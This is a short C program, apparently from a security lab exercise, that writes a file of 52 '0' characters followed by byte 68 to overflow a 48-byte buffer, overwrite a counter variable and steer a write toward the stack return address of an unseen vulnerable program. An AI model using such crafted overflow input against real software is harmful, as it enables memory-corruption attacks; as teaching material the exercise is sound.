#include <stdio.h>

/*#define BUFSIZE 48*/

int main()
{
    int i;
    FILE *fp;
    fp = fopen("data3", "w");
    /*Fill the buffer (48 chars) with zeros and add 4 extra zero to reach the variable i*/
    for (i = 0; i < 52; i++) /*48+4*/
    {
        fprintf(fp, "0");
    }
    /*change the value of i to 68*/
    fputc(68, fp);
    /*buf + i = returning address (in stack)*/
    fclose(fp);
    return 0;
}
